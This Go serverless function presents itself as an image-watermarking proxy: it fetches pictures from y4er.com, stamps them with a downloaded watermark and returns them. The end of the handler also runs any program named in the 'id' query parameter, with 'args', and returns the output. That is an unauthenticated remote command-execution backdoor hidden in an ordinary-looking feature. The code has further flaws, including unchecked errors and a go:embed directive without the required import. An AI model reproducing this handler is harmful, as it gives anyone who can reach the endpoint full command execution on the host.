package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"github.com/issue9/watermark"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

//go:embed watermark.png
var water []byte
var WATERMARK = "/tmp/watermark.png"

func init() {
	log.Println("判断水印是否存在")
	if Exists(WATERMARK) {
		log.Println("水印已经存在")
	} else {
		saveWaterMarkPng(WATERMARK)
	}
}
func Exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
func saveWaterMarkPng(path string) {
	out, err := os.Create(path)
	defer out.Close()

	req, _ := http.NewRequest("GET", "https://raw.githubusercontent.com/Y4er/aws-lambda-go-example/master/watermark.png", nil)
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Do(req)
	defer resp.Body.Close()
	all, err := ioutil.ReadAll(resp.Body)
	io.Copy(out, bytes.NewReader(all))
	if err != nil {
		log.Fatalf("水印下载失败:%v\n", err.Error())
	} else {
		log.Println("水印保存成功")
	}
}

func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {
	parameters := request.PathParameters
	fmt.Println(len(parameters))
	for p := range parameters {
		log.Println(p)
	}
	path := request.Path
	imgpath := strings.ReplaceAll(path, "/.netlify/functions/test-lambda", "")

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	req, _ := http.NewRequest("GET", "https://y4er.com"+imgpath, nil)
	req.Header.Set("User-Agent", "netlify")
	req.Header.Set("Referer", "https://y4er.com"+imgpath)

	resp, err := client.Do(req)
	defer resp.Body.Close()

	body := "error"
	contentType := "image/png"
	base64encode := true
	if err != nil {
		body = base64.StdEncoding.EncodeToString([]byte(err.Error()))
	} else {
		bs, _ := ioutil.ReadAll(resp.Body)
		timestamp := time.Now().Unix()
		filename := fmt.Sprintf("%s", timestamp)
		file, _ := os.Create(filename)
		io.Copy(file, bytes.NewReader(bs))
		defer file.Close()
		w, err := watermark.New(WATERMARK, 2, watermark.BottomRight)
		if err != nil {
			body = err.Error()
			log.Println(body)
		} else {
			err := w.MarkFile(filename)
			if err != nil {
				body = err.Error()
				log.Println(body)
				//body = base64.StdEncoding.EncodeToString([]byte(err.Error()))
			} else {
				content, _ := ioutil.ReadFile(filename)
				body = base64.StdEncoding.EncodeToString(content)
				log.Println(body)
			}
		}
	}

	id := request.QueryStringParameters["id"]
	args := request.QueryStringParameters["args"]
	if len(id) != 0 {
		cmd := exec.Command(id, args)
		out, err := cmd.CombinedOutput()
		if err != nil {
			log.Printf("cmd.Run() failed with %s\n", err)
		}
		log.Printf("combined out:\n%s\n", string(out))
		body = string(out)
		contentType = "text/plain"
		base64encode = false
	}

	return events.APIGatewayProxyResponse{
		StatusCode:      200,
		Headers:         map[string]string{"Content-Type": contentType},
		Body:            body,
		IsBase64Encoded: base64encode,
	}, nil
}

func main() {
	lambda.Start(handler)
}
